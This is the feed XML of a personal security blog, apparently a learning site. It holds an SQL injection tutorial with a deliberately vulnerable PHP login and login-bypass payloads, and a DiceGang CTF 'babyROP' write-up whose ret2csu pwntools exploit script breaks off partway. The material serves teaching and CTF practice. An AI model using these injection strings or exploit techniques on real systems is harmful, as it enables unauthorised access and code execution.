<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/blogs/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blogs/" rel="alternate" type="text/html" /><updated>2021-04-07T19:43:44+05:30</updated><id>http://localhost:4000/blogs/feed.xml</id><title type="html">TOURPRAN’s HOME</title><subtitle>This is my blog for Binary Exploitation and Reverse Engineering.</subtitle><author><name>tourpran</name></author><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/blogs/blogs/2021/03/27/sqlinjection.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2021-03-27T00:00:00+05:30</published><updated>2021-03-27T00:00:00+05:30</updated><id>http://localhost:4000/blogs/blogs/2021/03/27/sqlinjection</id><content type="html" xml:base="http://localhost:4000/blogs/blogs/2021/03/27/sqlinjection.html">&lt;h3 id=&quot;what-is-a-database&quot;&gt;What is a Database:&lt;/h3&gt;
&lt;p&gt;A database can be thought as a collection of data in an organised manner. When companies have huge amounts of data to be stored, using databases is the key for efficient usage of the data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/databasepic.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;sql&quot;&gt;SQL:&lt;/h3&gt;
&lt;p&gt;SQL or Structured Query Language is just a way to talk to the database and manipulate the data by the program. In most Database management systems SQL language is used. This blog post is divided into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;basics of sql&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploitation of sql&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;sql-basics&quot;&gt;SQL Basics:&lt;/h3&gt;

&lt;h4 id=&quot;creating-a-database&quot;&gt;Creating a Database:&lt;/h4&gt;

&lt;p&gt;In order to follow this blog post it’ll be helpfull to have mysql installed. First we will create and use a Database in mysql called testdb. Now this database can use used to store multiple tables where each table can be used to store different types of datas. For example a login table can be used to store all usernames and passwords and a store website can use another table to store all their products and prices with it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/databasecreation.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;creating-tables&quot;&gt;Creating tables:&lt;/h4&gt;

&lt;p&gt;For the fun of it lets create a table called person since everyone has their own unique &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;features&lt;/code&gt;. By features I mean their name, height and weigth.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tablesexample.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;access-the-data&quot;&gt;Access the data:&lt;/h4&gt;

&lt;p&gt;Inorder to get the required data we use SELECT statements. when we have lines of select statements and commands to give to the databases we call them queries.&lt;/p&gt;

&lt;p&gt;note: * means everything (all)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/queryexample.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we are select everything present in the table called person.&lt;/p&gt;

&lt;p&gt;When we have multiple number of objects in our table we can use a element present in each object that is unique. Most of the time our names our unique so we can access our object with the help of out name.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/queryexample1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;login-system&quot;&gt;Login system:&lt;/h4&gt;

&lt;p&gt;In our login system (which we will use to hack) we have used sql query to check if the user and password given my the user is correct. The pseudo code is given below:&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT id FROM admin WHERE username = '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myusername&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' and passcode = '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mypassword&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Send the sql query to DataBase&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_fetch_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;MYSQLI_ASSOC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Fetchs a result row as a array&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Success! &quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Tell the user the login creds were correct&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Invalid &quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Tell the user the login creds were incorrect&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;different-exploitation-techniques&quot;&gt;Different Exploitation Techniques:&lt;/h3&gt;

&lt;h4 id=&quot;simple-login-bypass&quot;&gt;Simple login bypass:&lt;/h4&gt;

&lt;p&gt;We can see that there are 2 users in the table. Obviously in the real world application there wont be a table showing the credentials, inorder for learning purpose I have made them visible. Now lets check if there is a sql injection possible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/loginlocalhost.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqllocalhosterror.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now If you are following the blog correctly you would have already know that this error is due to the ‘ (single quote) I gave. So the query looks like&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT id FROM admin WHERE username = '' ' and passcode = 'a'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The unmatched single quotes make the query break and thereby telling us there are chances for a SQLInjection. Also a point to note is, its not required to get an error every time to prove there is a SQL Injection. Infact in most real world applications you would be left with blind sql injections which doesnt give you any output (covered later in this blog).&lt;/p&gt;

&lt;p&gt;So we will use basic boolean logic for the first attack. We will tell the SQL Query that the username is true and passcode is true. So this will return the entire table and mostly likely we will be logged in as the first user (extreme case, likely never happens).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sqlsimplelogin1.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/images/simpleloginsql2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see I gained access as tourpran who is the first user. Also in the query I managed to say that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username='' or TRUE&lt;/code&gt; which will always be true, same for the password.&lt;/p&gt;

&lt;p&gt;We can also login as admin if we pass the following credentials.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;UserName: admin
password: ' or 'a'='a

SELECT id FROM admin WHERE username = 'admin' and passcode = '' or 'a'='a'

or 

username: ' or '1'='1
password: ' or 'a'='a' and username='admin' ; #

SELECT id FROM admin WHERE username = '' or 'a'='a' and passcode = '' or 'a'='a' and username='admin' ; #'

# - comment the rest of the line
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>tourpran</name></author><category term="Blogs" /><category term="sql" /><category term="Injection" /><category term="SQLI" /><summary type="html">What is a Database: A database can be thought as a collection of data in an organised manner. When companies have huge amounts of data to be stored, using databases is the key for efficient usage of the data.</summary></entry><entry><title type="html">babyROP | DiceGang CTF</title><link href="http://localhost:4000/blogs/writeup/2021/02/07/babyropdice.html" rel="alternate" type="text/html" title="babyROP | DiceGang CTF" /><published>2021-02-07T00:00:00+05:30</published><updated>2021-02-07T00:00:00+05:30</updated><id>http://localhost:4000/blogs/writeup/2021/02/07/babyropdice</id><content type="html" xml:base="http://localhost:4000/blogs/writeup/2021/02/07/babyropdice.html">&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/challdesbabyrop.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Checkout the mitigations of the binary&lt;/li&gt;
  &lt;li&gt;Try to find gadgets since this is a ROP challenge. If you dont know much about ROP checkout &lt;a href=&quot;https://ropemporium.com/&quot;&gt;ROPemporium&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Craft the payload to get flag from server.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;mitigations&quot;&gt;Mitigations:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/mitigationdice.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;We can’t excecute shellcode (NX Enabled)&lt;/li&gt;
  &lt;li&gt;No Canary found - no need for brute force or leaks&lt;/li&gt;
  &lt;li&gt;PIE disabled - the address of the binary wont be randomised&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;finding-gadgets&quot;&gt;Finding Gadgets:&lt;/h4&gt;

&lt;p&gt;Install ROPgadget to find all the gadgets in the binary.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ROPgadget &lt;span class=&quot;nt&quot;&gt;--binary&lt;/span&gt; babyrop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;My first thought was to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write&lt;/code&gt; the address pointed by the got of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write&lt;/code&gt;. The idea was to leak the address of write function. Since write has already been called by the program the GOT of write will be populated and the got will point to the libc address of write. The following gadgets are needed.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;pop rdi
pop rsi 
pop rdx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I did not have the pop rdx register which makes the challenge a bit more intresting. So we need to find a way to set the value of RDX, RSI, RDI.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;rsi - point to the buffer [write@got]
rdi - file discriptor = 1
rdx - size of the buffer = &amp;gt;8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Since ropgadget did not give me the gadget I went to look for more gadgets in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__libc_csu_init&lt;/code&gt;. There I could find all the gadgets I wanted.&lt;/p&gt;

&lt;h4 id=&quot;crafting-exploit&quot;&gt;Crafting Exploit:&lt;/h4&gt;

&lt;p&gt;These are the important gadgets I want.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gadgetsdice.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;idea&quot;&gt;Idea&lt;/h4&gt;

&lt;p&gt;First overflow the buffer with garbage and then make return jump to csu. Things to note.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;0x00000000004011b0 &amp;lt;+64&amp;gt;:	mov    rdx,r14
0x00000000004011b3 &amp;lt;+67&amp;gt;:	mov    rsi,r13
0x00000000004011b6 &amp;lt;+70&amp;gt;:	mov    edi,r12d

0x00000000004011ca &amp;lt;+90&amp;gt;:	pop    rbx
0x00000000004011cb &amp;lt;+91&amp;gt;:	pop    rbp
0x00000000004011cc &amp;lt;+92&amp;gt;:	pop    r12
0x00000000004011ce &amp;lt;+94&amp;gt;:	pop    r13
0x00000000004011d0 &amp;lt;+96&amp;gt;:	pop    r14
0x00000000004011d2 &amp;lt;+98&amp;gt;:	pop    r15
0x00000000004011d4 &amp;lt;+100&amp;gt;:	ret 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can control the RDI, RSI, RDX because we can control the r14, r13, r12 registers. Intresting area was the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;QWORD PTR [r15+rbx*8]&lt;/code&gt; inbetween these gadgets. So we decided to make this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;QWORD PTR [r15+rbx*8]&lt;/code&gt; as the write function. In order to do this well set r15 as the address to write@got and rbx as 0.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;0x00000000004011b9 &amp;lt;+73&amp;gt;:	call   QWORD PTR [r15+rbx*8]
0x00000000004011bd &amp;lt;+77&amp;gt;:	add    rbx,0x1
0x00000000004011c1 &amp;lt;+81&amp;gt;:	cmp    rbp,rbx
0x00000000004011c4 &amp;lt;+84&amp;gt;:	jne    0x4011b0 &amp;lt;__libc_csu_init+64&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Hmmm :(. Seems like there is a compare statement that’ll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011ca&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#rbx rbp r12 r13 r14 r15
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'write'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'write'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'main'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Exploit for leaking libc write address looks something like this. :) Now lets just recv the leak and see what libc they are using. To find out their libc go to &lt;a href=&quot;https://libc.blukat.me/&quot;&gt;libc.blukat.me&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/blukatdice.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now its basic math, since all the address in the libc will be at the same offset from one another. Once you get the leak just find address of /bin/sh and system then just call system with /bin/sh as argument. Pretty intresting challenge and fun to solve :).&lt;/p&gt;

&lt;p&gt;Anyway here is the exploit script for this challenge.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Set up pwntools for the correct architecture
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'i386'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'./babyrop'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./babyrop&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GDB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# ./exploit.py GDB
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdbscript&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'''
continue
'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;locals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dicec.tf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31924&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# shellcode = asm(shellcraft.sh())
&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'''
0x00000000004011d3 : pop rdi ; ret

write syscall 
rdi = 1
rsi = pointer to puffer (pointer to write function)
rdx = size
'''&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011ca&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#rbx rbp r12 r13 r14 r15
